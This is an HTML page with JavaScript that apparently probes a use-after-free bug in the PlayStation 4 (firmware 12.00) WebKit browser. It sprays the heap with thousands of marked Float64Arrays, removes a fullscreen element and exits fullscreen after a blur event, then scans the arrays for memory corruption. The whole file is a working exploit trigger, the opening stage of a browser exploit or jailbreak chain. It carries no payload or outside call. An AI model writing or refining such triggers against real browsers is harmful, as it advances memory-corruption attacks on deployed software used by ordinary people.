<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fullscreen UAF - v2</title>
</head>
<body>
  <h2>PS4 12.00 - Fullscreen UAF Test (v2)</h2>
  <button onclick="runTest()">Iniciar Teste</button>
  <div id="log"></div>

  <script>
const PATTERN = 2.121995791e-314;
const BLUR_DELAY_MS = 80;
const CORRUPTION_CHECK_DELAY_MS = 150;

let controllers = [];

function log(msg) {
    try { console.log(msg); } catch(e) {}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

function setupHeap() {
    controllers = [];
    for (let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        arr[1] = PATTERN;
        controllers.push(arr);
    }
    log("[*] Heap: 5000 Float64Arrays alocados (PATTERN em [1])");
}

function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < controllers.length; i++) {
        const expectedIndex = i;
        const expectedPattern = PATTERN;
        if (controllers[i][0] !== expectedIndex || controllers[i][1] !== expectedPattern) {
            log("[!!!] CORRUPTION at controllers[" + i + "]"
                + " → [0]=" + controllers[i][0]
                + " expected=" + expectedIndex
                + " | [1]=" + controllers[i][1]
                + " expected=" + expectedPattern);
            corrupted++;
            if (corrupted >= 10) {
                log("[!!!] Limite de relato atingido, abortando scan.");
                break;
            }
        }
    }
    if (corrupted === 0) {
        log("[OK] Nenhuma corrupção detectada nos arrays.");
    } else {
        log("[!!!] Total corrompidos: " + corrupted);
    }
}

function setupFullscreen() {
    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1>FULLSCREEN ACTIVE — Pressione OPTIONS</h1>";
    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

function trigger(fsTarget) {
    log("[*] Trigger: remove() + exitFullscreen()");

    const refBeforeRemove = document.webkitFullscreenElement;
    log("[*] webkitFullscreenElement antes do remove: " + (refBeforeRemove ? "presente" : "null"));

    try {
        fsTarget.remove();
    } catch(e) {
        log("[ERRO] remove(): " + e);
    }

    const refAfterRemove = document.webkitFullscreenElement;
    log("[*] webkitFullscreenElement após remove(): " + (refAfterRemove ? "AINDA PRESENTE (dangling?)" : "null"));

    try {
        if (document.webkitIsFullScreen || document.fullscreenElement || refAfterRemove) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
            log("[*] exitFullscreen() chamado");
        } else {
            log("[*] exitFullscreen() pulado (não estava em fullscreen)");
        }
    } catch(e) {
        log("[ERRO] exitFullscreen(): " + e);
    }

    setTimeout(() => {
        log("[*] Verificando corrupção de heap...");
        checkCorruption();
    }, CORRUPTION_CHECK_DELAY_MS);
}

function runTest() {
    document.getElementById("log").innerHTML = "";
    log("[*] Iniciando teste...");

    setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur disparado — aguardando " + BLUR_DELAY_MS + "ms para trigger");
        window.onblur = null;
        setTimeout(() => trigger(fsTarget), BLUR_DELAY_MS);
    };
}
  </script>
</body>
</html>
